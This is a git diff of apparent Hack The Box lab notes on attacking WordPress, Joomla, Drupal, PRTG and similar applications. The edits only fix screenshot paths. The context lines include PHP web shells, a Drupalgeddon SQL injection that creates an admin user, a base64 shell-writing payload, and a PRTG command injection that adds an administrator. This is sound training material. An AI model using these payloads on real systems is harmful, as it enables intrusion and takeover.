@@ -224,11 +224,11 @@ The report will be saved as HTML
 
 ![Screenshot_2026-03-31_15_43_49.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/ca49c4b8-753d-4b57-8ca9-c4bdd5b6be6b.png)
 
-![Screenshot_2026-03-31_15_44_08.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/94e21fe6-0a29-476b-9646-bcff73793340.png)
+![Screenshot_2026-03-31_15_44_08.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/94e21fe6-0a29-476b-9646-bcff73793340.png)
 
-![Screenshot_2026-03-31_15_44_34.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/6bf943e0-e2a2-4a9e-8f90-9575c252a751.png)
+![Screenshot_2026-03-31_15_44_34.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/6bf943e0-e2a2-4a9e-8f90-9575c252a751.png)
 
-![Screenshot_2026-03-31_15_44_52.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ef4a34b7-a93e-4269-9e77-307a6cd8d173.png)
+![Screenshot_2026-03-31_15_44_52.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/ef4a34b7-a93e-4269-9e77-307a6cd8d173.png)
 
 Note in the endpoint `drupal-acc.inlanefreight.local` and `drupal-qa.inlanefreight.local` It still has the default credentials applied “admin:admin”, the  same thing applies to other vhosts 
 
@@ -281,7 +281,7 @@ Wrote HTML report to: aquatone_report.html
 
 the `aquatone_report.html` 
 
-![Screenshot_2026-03-31_16_34_42.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/298b1a0a-d7f9-4763-a3ed-c736f7865ae3.png)
+![Screenshot_2026-03-31_16_34_42.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/298b1a0a-d7f9-4763-a3ed-c736f7865ae3.png)
 
 ### Nessus
 
@@ -385,7 +385,7 @@ $ curl -s http://blog.inlanefreight.local/  | grep "plugin"
 
 Browsing to `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` shows us that directory listing is enabled and that a `readme.txt` file is present.
 
-![Screenshot_2026-04-02_11_32_29.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/59661564-0339-410e-bdeb-f929031a11c5.png)
+![Screenshot_2026-04-02_11_32_29.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/59661564-0339-410e-bdeb-f929031a11c5.png)
 
 From the readme, it appears that version 1.0.0 of the plugin is installed, which suffers from a [Local File Inclusion](https://www.exploit-db.com/exploits/50226) vulnerability
 
@@ -428,7 +428,7 @@ At this stage, we will try to enumerate users and inspect the response, also che
 
 Here I tried to login a valid username and an invalid password, which resulted in the following message:
 
-![Screenshot_2026-04-02_11_55_40.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/f992940b-da55-4e34-add9-435862aadf5c.png)
+![Screenshot_2026-04-02_11_55_40.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/f992940b-da55-4e34-add9-435862aadf5c.png)
 
 However, invalid username result in this error message
 
@@ -978,7 +978,7 @@ Valid credentials: `doug: jessica1`
 
 With administrative access to WordPress, we can modify the PHP source code to execute system commands. After login with the credentials found, from the `Appearance` tab, click on `Theme Editors`
 
-![Screenshot_2026-04-03_10_13_39.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/6916cdea-855b-4119-bb80-831a52a1257d.png)
+![Screenshot_2026-04-03_10_13_39.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/6916cdea-855b-4119-bb80-831a52a1257d.png)
 
 This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.
 
@@ -990,7 +990,7 @@ system($_GET[0]);
 
 The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.
 
-![Screenshot_2026-04-03_11_36_52.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/7a018b10-4f2d-4fb3-bdf7-c601ca868893.png)
+![Screenshot_2026-04-03_11_36_52.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images//7a018b10-4f2d-4fb3-bdf7-c601ca868893.png)
 
 Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`
 
@@ -1095,7 +1095,7 @@ host for sensitive data or paths for vertical/horizontal privilege escalation an
 
 The exploitation from Metasploit didn't work for me, so I tested it manually. I first uploaded the PHP file to the uploads section in the **Plugins** tab
 
-![Screenshot_2026-04-03_13_53_55.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/8f4a088e-8ae9-42e2-bf39-ec3aa04fb3e9.png)
+![Screenshot_2026-04-03_13_53_55.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/8f4a088e-8ae9-42e2-bf39-ec3aa04fb3e9.png)
 
 But that didnt work because it requires a zip file format. So I added this simple PHP web shell into the test.zip file
 
@@ -1119,7 +1119,7 @@ system($_GET['cmd']);?>
 
 and uploaded the test.zip that contains this PHP file, and it worked!. 
 
-![Screenshot_2026-04-03_13_26_59.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/3e7a448f-0640-4cd8-a5d2-a60bb518b3bb.png)
+![Screenshot_2026-04-03_13_26_59.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/3e7a448f-0640-4cd8-a5d2-a60bb518b3bb.png)
 
 The last step is to activate the plugin and navigate to the plugin directory to achieve remote code execution
 
@@ -1134,7 +1134,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 If you look at the source code, you will see it uses `include` function to include local files without any type of input validation or sanitization.
 
-![Screenshot_2026-04-03_14_03_12.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ccf78a32-6246-4301-8be4-34cf5bb41f9f.png)
+![Screenshot_2026-04-03_14_03_12.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/ccf78a32-6246-4301-8be4-34cf5bb41f9f.png)
 
 Using this, we can include arbitrary files on the web server. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`
 
@@ -1156,7 +1156,7 @@ mrb3n:x:1002:1002::/home/mrb3n:/bin/sh
 
 [wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. 
 
-![Screenshot_2026-04-03_21_44_50.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/81a9518a-6425-4dda-8ec3-91365bbae05c.png)
+![Screenshot_2026-04-03_21_44_50.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/81a9518a-6425-4dda-8ec3-91365bbae05c.png)
 
 The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. We will use this [exploit](https://www.exploit-db.com/exploits/49967), it takes two parameters: `-u` the URL and `-p` the path to a valid post.
 
@@ -1205,7 +1205,7 @@ As we have seen from the last two sections, WordPress presents a vast attack sur
 
 Browse the target and check what is running. 
 
-![Screenshot_2026-04-03_22_03_06.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/36b4fc1c-8a56-4561-8312-7aadd0468e6f.png)
+![Screenshot_2026-04-03_22_03_06.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/36b4fc1c-8a56-4561-8312-7aadd0468e6f.png)
 
 we can also use curl to confirm the target CMS
 
@@ -1395,7 +1395,7 @@ End Scanner
 
 At this point, we know that we are dealing with Joomla `3.9.4`. The administrator login portal is located at `http://dev.inlanefreight.local/administrator/index.php`. Attempts at user enumeration return a generic error message.
 
-![Screenshot_2026-04-05_12_35_35.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/b8d36f8f-e1a9-40c4-aeb8-4fc774e859c0.png)
+![Screenshot_2026-04-05_12_35_35.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/b8d36f8f-e1a9-40c4-aeb8-4fc774e859c0.png)
 
 The default administrator account on Joomla installs is `admin`, but the password is set at install time. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.
 
@@ -1412,15 +1412,15 @@ $ sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w  /usr/share/
 
 Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.
 
-![Screenshot_2026-04-05_12_49_37.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/47613bde-2d15-4e01-8c41-8a09a0a98c93.png)
+![Screenshot_2026-04-05_12_49_37.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/47613bde-2d15-4e01-8c41-8a09a0a98c93.png)
 
 From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
 
-![Screenshot_2026-04-05_12_51_37.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/47e31e3b-89cb-4d6e-9294-95d4feac6531.png)
+![Screenshot_2026-04-05_12_51_37.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/47e31e3b-89cb-4d6e-9294-95d4feac6531.png)
 
 Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.
 
-![Screenshot_2026-04-05_12_54_44.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/199b149a-42dc-449b-a962-ee410c19fa10.png)
+![Screenshot_2026-04-05_12_54_44.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/199b149a-42dc-449b-a962-ee410c19fa10.png)
 
 Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.
 
@@ -1501,7 +1501,7 @@ GET /administrator//?option=com_media&view=mediaList&tmpl=component&folder=/.. H
 Host: dev.inlanefreight.local
 ```
 
-![Screenshot_2026-04-05_14_52_26.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d1669693-e2c0-4506-98f4-cbfe19ccd4fa.png)
+![Screenshot_2026-04-05_14_52_26.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/d1669693-e2c0-4506-98f4-cbfe19ccd4fa.png)
 
 ```bash
 $ curl http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt -H "Cookie: b3832796fcc06a2991b186374e8f3acf=ls0kg6cdj4sdm406lmcmj5mc33"
@@ -1590,7 +1590,7 @@ In older version of Drupal (before 8)it was possible to log in as an admin and e
     
     
 
-![Screenshot_2026-04-06_14_44_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/18bd0bb4-c845-40f6-88e0-b964f0da7312.png)
+![Screenshot_2026-04-06_14_44_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/18bd0bb4-c845-40f6-88e0-b964f0da7312.png)
 
 ![Drupal modules page with PHP filter module highlighted, allowing embedded PHP code to be evaluated.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/drupal_php_module.png)
 
@@ -1618,7 +1618,7 @@ We also want to make sure to set `Text format` drop-down to `PHP code`. After cl
 http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
 
-![Screenshot_2026-04-06_15_06_22.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d0502f1b-108e-45b1-b81d-755ee4dc2198.png)
+![Screenshot_2026-04-06_15_06_22.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/d0502f1b-108e-45b1-b81d-755ee4dc2198.png)
 
 On Vhost `drupal.inlanefreight.local/` the version installed is 8.9.0 ~ 8.9.1 and from version 8 onward, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves ( we need to check with clients before adding or changing something). Start by downloading the most recent version of the module from the Drupal website.
 
@@ -1638,7 +1638,7 @@ http://drupal.inlanefreight.local/admin/reports/updates/install
 
 From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.If it says it was installed already, check in the Extend tab and check the PHP Filter
 
-![Screenshot_2026-04-06_16_13_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/8e32a44b-45a7-4cae-80a0-8ed137cf434d.png)
+![Screenshot_2026-04-06_16_13_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/8e32a44b-45a7-4cae-80a0-8ed137cf434d.png)
 
 Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.
 
@@ -1729,7 +1729,7 @@ $ proxychains4 python2.7 34992  -t http://drupal-qa.inlanefreight.local -u hacke
                                                                         
 ```
 
-![Screenshot_2026-04-07_14_00_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/cdeeaf6a-ecf8-401c-9e39-07be30741f7c.png)
+![Screenshot_2026-04-07_14_00_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/cdeeaf6a-ecf8-401c-9e39-07be30741f7c.png)
 
 This is the POST form 
 
@@ -1745,7 +1745,7 @@ name[0 ;insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'hacke
 
 After logging, you will see that the current user now has administrative role
 
-![Screenshot_2026-04-06_17_20_03.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/52af78fb-ab57-4c9f-91d0-5983f1bebb1c.png)
+![Screenshot_2026-04-06_17_20_03.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/52af78fb-ab57-4c9f-91d0-5983f1bebb1c.png)
 
 We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.
 
@@ -1753,7 +1753,7 @@ We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7
 
 We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.
 
-![Screenshot_2026-04-07_14_08_40.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-04-07_14_08_40.png)
+![Screenshot_2026-04-07_14_08_40.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-04-07_14_08_40.png)
 
 ```bash
 form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo ";-)" | tee hello.txt
@@ -1771,7 +1771,7 @@ This is a [technical deta](https://research.checkpoint.com/2018/uncovering-drupa
 $ echo'<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
 ```
 
-![Screenshot_2026-04-07_14_32_57.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/5383d858-fbd2-4832-be82-93710f11ece6.png)
+![Screenshot_2026-04-07_14_32_57.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/5383d858-fbd2-4832-be82-93710f11ece6.png)
 
 ```bash
 form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php
@@ -1792,7 +1792,7 @@ The exploit do as follow:
 
 1. After login as admin, visit an exiting node to delete
 
-![Screenshot_2026-04-07_15_25_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/7a52406c-8739-47c8-a78e-ef4ac90ebc81.png)
+![Screenshot_2026-04-07_15_25_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/7a52406c-8739-47c8-a78e-ef4ac90ebc81.png)
 
 1. Then it search in the source code for `form_token` and `form_build_id`
 
@@ -1809,7 +1809,7 @@ http://drupal-qa.inlanefreight.local/?q=node/1/delete&destination=node?q[%23][]=
 form_id=node_delete_confirm&_triggering_element_name=form_id&form_token=YOUR_TOKEN_HERE
 ```
 
-![Screenshot_2026-04-07_15_58_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/0e8225d5-90a5-4940-93ee-9386c1783b71.png)
+![Screenshot_2026-04-07_15_58_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/0e8225d5-90a5-4940-93ee-9386c1783b71.png)
 
 The second POST, it takes the form_build_id from the first POST response and send this POST
 
@@ -1866,15 +1866,15 @@ Would you like to open the report now? [Y/n]
 y
 ```
 
-![Screenshot_2026-04-07_22_48_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/2be6b51a-ca42-4712-a857-b5adf8ec78a1.png)
+![Screenshot_2026-04-07_22_48_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/2be6b51a-ca42-4712-a857-b5adf8ec78a1.png)
 
 Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Here we can see that Tomcat version `9.0.30` is in use.
 
-![Screenshot_2026-04-07_22_57_00.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/c7382ac5-f832-4478-ac72-08bf2c93ddbd.png)
+![Screenshot_2026-04-07_22_57_00.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/c7382ac5-f832-4478-ac72-08bf2c93ddbd.png)
 
 Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the `docs` page
 
-![Screenshot_2026-04-07_23_01_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/4bb814ca-eb51-4957-9bd5-313b7e9db079.png)
+![Screenshot_2026-04-07_23_01_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/4bb814ca-eb51-4957-9bd5-313b7e9db079.png)
 
 This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.
 
@@ -2240,7 +2240,7 @@ The default installation typically uses Jenkins’ database to store credentials
 We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin`
  or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. While rare, we have come across Jenkins during external penetration tests that we were able to attack.
 
-![Screenshot_2026-04-08_11_39_25.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/b595692e-eae6-4fb2-90c4-048a8929cbbf.png)
+![Screenshot_2026-04-08_11_39_25.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/b595692e-eae6-4fb2-90c4-048a8929cbbf.png)
 
 After we logged in as admin:admin, we can see that the version is 2.303.1
 
@@ -2263,7 +2263,7 @@ proc.waitForOrKill(1000)
 println sout
 ```
 
-![Screenshot_2026-04-08_11_52_14.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/251582c0-0a58-4a1d-9f66-e415d6b9f3b4.png)
+![Screenshot_2026-04-08_11_52_14.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/251582c0-0a58-4a1d-9f66-e415d6b9f3b4.png)
 
 To gain a reverse shell:
 
@@ -2414,7 +2414,7 @@ nt authority\system
 
 As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.
 
-![Screenshot_2026-04-09_13_26_11.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/be3a33f7-a079-4112-a02d-532609893dfa.png)
+![Screenshot_2026-04-09_13_26_11.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/be3a33f7-a079-4112-a02d-532609893dfa.png)
 
 In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.
 
@@ -2450,7 +2450,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 From the Nmap scan above, we can see the service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080.
 
-![Screenshot_2026-04-09_13_55_54.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d24d2881-6286-4cd9-98da-dbc084e5bedd.png)
+![Screenshot_2026-04-09_13_55_54.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/d24d2881-6286-4cd9-98da-dbc084e5bedd.png)
 
 THe default credentials is `prtgadmin:prtgadmin` we can try this fist. Our first attempt to log in with the default credentials fails, but a few tries later, we are in with `prtgadmin:Password123`.
 
@@ -2470,7 +2470,7 @@ This [blog post](https://www.codewatch.org/blog/?p=453) explains the details of 
 
 To begin, Hover on `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`. Next, click on `Add new notification`.
 
-![Screenshot_2026-04-09_14_31_31.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/84b6632e-25f0-48c5-9acf-f833ccc1b55e.png)
+![Screenshot_2026-04-09_14_31_31.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/84b6632e-25f0-48c5-9acf-f833ccc1b55e.png)
 
 Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down, lastly, in the parameter field enter the PS command you want to inject, here we added this command to create a new account in the Administrators group
 
@@ -2478,11 +2478,11 @@ Give the notification a name and scroll down and tick the box next to `EXECUTE P
 test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
 ```
 
-![Screenshot_2026-04-09_14_16_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/a5aab90f-2400-43ee-9b39-f3e18b441ca0.png)
+![Screenshot_2026-04-09_14_16_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/a5aab90f-2400-43ee-9b39-f3e18b441ca0.png)
 
 Save the configuration, then you will return to the notifications and from there activate the notification by clicking on the notification and selecting from the right column `Send Test Notification`  (the alarm emojy)
 
-![Screenshot_2026-04-09_14_17_33.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/94344364-040f-4813-a809-5ec12f57adcd.png)
+![Screenshot_2026-04-09_14_17_33.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/94344364-040f-4813-a809-5ec12f57adcd.png)
 
 TO confirm the execution, we can use `CrackMapExec` to confirm local admin access
 
@@ -2569,11 +2569,11 @@ is illustrated in the HTB weekly release box [Delivery](https://0xdf.gitlab.io/2
 
 Create a ticket
 
-![Screenshot_2026-04-14_14_17_19.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/5343ee72-7b8e-416d-914c-9a51eb074568.png)
+![Screenshot_2026-04-14_14_17_19.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/5343ee72-7b8e-416d-914c-9a51eb074568.png)
 
 Upon creating the ticket we got a temporary email with the company’s domain so we can track our ticket
 
-![Screenshot_2026-04-14_14_18_21.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d1185258-9319-4704-8997-b3c77bdec91b.png)
+![Screenshot_2026-04-14_14_18_21.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/d1185258-9319-4704-8997-b3c77bdec91b.png)
 
 ```python
 id: 792546.
@@ -2582,7 +2582,7 @@ id: 792546.
 
 Now we can use this new email to register to other portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, and use the help desk support portal to receive a sign-up confirmation email.
 
-![Screenshot_2026-04-14_14_22_47.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/7a4439c2-a71a-4121-bcce-b1d953239f5e.png)
+![Screenshot_2026-04-14_14_22_47.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/7a4439c2-a71a-4121-bcce-b1d953239f5e.png)
 
 ### **osTicket - Sensitive Data Exposure**
 
@@ -2633,15 +2633,15 @@ On the support portal, The kevin user credentials worked and it appears that he 
 http://support.inlanefreight.local/scp/login.php
 ```
 
-![Screenshot_2026-04-14_14_40_07.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d9c4bed4-405a-4ef7-901e-8803bc99fab0.png)
+![Screenshot_2026-04-14_14_40_07.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/d9c4bed4-405a-4ef7-901e-8803bc99fab0.png)
 
 and also there is a clonsed ticket
 
-![Screenshot_2026-04-14_14_41_06.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/42474c72-a078-4d02-af48-699931c240ee.png)
+![Screenshot_2026-04-14_14_41_06.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/42474c72-a078-4d02-af48-699931c240ee.png)
 
 As shown below, the agent commits an error and send the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it.
 
-![Screenshot_2026-04-14_14_43_36.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/e8b75459-f6e0-4768-b163-68345e1ffbb9.png)
+![Screenshot_2026-04-14_14_43_36.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/e8b75459-f6e0-4768-b163-68345e1ffbb9.png)
 
 Furthermore, the support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. 
 
@@ -2687,20 +2687,20 @@ There have been a few serious exploits against GitLab [12.9.0](https://www.explo
 
 There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to `/explore` and see if there are any public projects that may contain something interesting. 
 
-![Screenshot_2026-04-14_16_57_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/00675c39-c5ba-4f30-87b3-fa17dee28ba4.png)
+![Screenshot_2026-04-14_16_57_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/00675c39-c5ba-4f30-87b3-fa17dee28ba4.png)
 
 Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.
 
 Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around.
 
-![Screenshot_2026-04-14_17_02_19.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ce688459-5289-4676-a140-038a806b6143.png)
+![Screenshot_2026-04-14_17_02_19.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/ce688459-5289-4676-a140-038a806b6143.png)
 
 From here, we can explore each of the pages linked in the top left `groups`, `snippets`, and `help`.
  We can also use the search functionality and see if we can uncover any other projects. Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data.
 
 We can also use the registration form to enumerate valid users.If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as `Dehashed` as seen in the osTicket section.
 
-![Screenshot_2026-04-14_17_10_42.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/ff77f35d-d658-4811-bbff-82d58a410b2d.png)
+![Screenshot_2026-04-14_17_10_42.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/ff77f35d-d658-4811-bbff-82d58a410b2d.png)
 
 Here, we can see the root username is taken, we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error 
 
@@ -2779,7 +2779,7 @@ uid=996(git) gid=997(git) groups=997(git)
 
 I changed the exploit to allow forward the traffic through proxy. As described in hackerone report, the vulnerability exists because Exiftool determine the file type by examining the file content
 
-![Screenshot_2026-04-15_22_51_16.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/52c15761-82f2-44cc-b633-e919017973d8.png)
+![Screenshot_2026-04-15_22_51_16.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/52c15761-82f2-44cc-b633-e919017973d8.png)
 
 The issue is in DjVu metadata. If we inserted the backslash followed by a newline, the Exiftool will parse the perl code inside the quotes
 
@@ -4184,7 +4184,7 @@ Nmap done: 1 IP address (1 host up) scanned in 80.99 seconds
 
 The application running tomcat version **9.0.0.M1** 
 
-![Screenshot_2026-05-26_23_14_58.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-26_23_14_58.png)
+![Screenshot_2026-05-26_23_14_58.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-26_23_14_58.png)
 
 for more info about the vulnerability, read this [blog](https://medium.com/@lhuang33/cve-2017-12617-tomcat-file-upload-rce-vulnerability-83983493d767)
 
@@ -4192,7 +4192,7 @@ for more info about the vulnerability, read this [blog](https://medium.com/@lhua
 
 on the port 8000 Jenkins is running
 
-![Screenshot_2026-05-27_18_33_13.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-27_18_33_13.png)
+![Screenshot_2026-05-27_18_33_13.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-27_18_33_13.png)
 
 ### **Major Critical Vulnerabilities in Version 9.0.0.M1**
 
@@ -4273,7 +4273,7 @@ cmd
 
 ```
 
-![Screenshot_2026-05-27_21_17_20.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-27_21_17_20.png)
+![Screenshot_2026-05-27_21_17_20.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Images/Screenshot_2026-05-27_21_17_20.png)
 
 # **Attacking Common Applications - Skills Assessment II**
 
@@ -4307,7 +4307,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.25 seconds
 
 public gitlabs
 
